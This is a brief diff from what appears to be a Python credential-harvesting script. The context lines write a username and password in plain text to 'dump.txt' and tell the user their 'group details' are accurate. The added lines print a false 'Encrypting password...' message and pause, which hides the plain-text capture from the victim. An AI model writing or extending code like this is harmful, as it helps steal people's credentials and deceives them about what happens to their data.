@@ -47,6 +47,8 @@ else:
             f = open("dump.txt", "w")
             f.write('%s:%s' % (username, password))
             success = True
+            print("Encrypting password...")
+            sleep(5)
             print("YOUR GROUP DETAILS ARE ACCURATE")
             print(arr)
     f.close()
